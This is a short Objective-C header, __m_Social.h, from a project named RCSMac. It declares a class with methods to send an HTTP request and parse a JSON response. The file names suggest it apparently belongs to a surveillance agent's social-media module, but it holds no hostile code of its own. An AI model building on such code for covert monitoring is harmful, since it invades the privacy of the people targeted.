//
//  __m_Social.h
//  RCSMac
//
//  Created by guido on 3/22/13.
//
//

#import <Foundation/Foundation.h>
#import "social.h"

@interface __m_Social : NSObject
- (NSData *)sendHttpRequest: (NSString *)httpURL;
- (NSDictionary *)getParsedHttpResponse: (NSString *)httpURL jsonOffset: (int)jsonOffset;
@end
